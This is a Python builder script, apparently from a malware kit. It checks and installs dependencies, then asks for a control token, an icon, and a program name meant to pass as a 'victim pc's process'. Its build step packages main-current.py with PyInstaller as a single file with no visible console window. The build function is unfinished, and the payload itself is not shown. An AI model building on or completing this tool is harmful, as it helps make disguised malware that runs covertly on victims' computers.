import subprocess
import sys

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])


def build(TOKEN, PROGRAMNAME, ICON):
    if ICON == "":
        ICON = "icon.ico"
    build_command = f"pyinstaller --clean --onefile --noconsole --icon={ICON} main-current.py --add-data=seedir\\*:seedir"
    # NOTE: achieve modifying file by reading the main-developer first, modify lines by doing data[0] = something like that, then
    # NOTE: creat a cache.py file, pyinstaller it and then delete it.

result = subprocess.run(['pip', 'freeze'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
installed_packages = result.stdout.split('\n')
with open("requirements.txt", 'r', encoding="utf-8") as f:
    necessary_packages = f.readlines()

for necessary in necessary_packages:
    necessary = necessary.rstrip('\n')
    print(f"Checking if {necessary} is installed...")
    if any(necessary in installed.lower() for installed in installed_packages):
        continue
    else:
        response = input(f"{necessary} isn't installed. Install?(y/no): ")
        while True:
            if response == 'y':
                install(necessary)
                break
            elif response == 'no':
                print("ok..")
                input("Press Enter to Exit")
                quit()

print('\n')
token = None
while not token:
    token = input("Please input your token: ")
    if not token:
        print("Please enter a valid token")
programname = str(input("Enter program name you desire ( leave blank to set as victim pc's process ): ")) # TODO: achieve this function
icon = str(input("Enter icon path ( leave blank to set as icon.ico ): "))
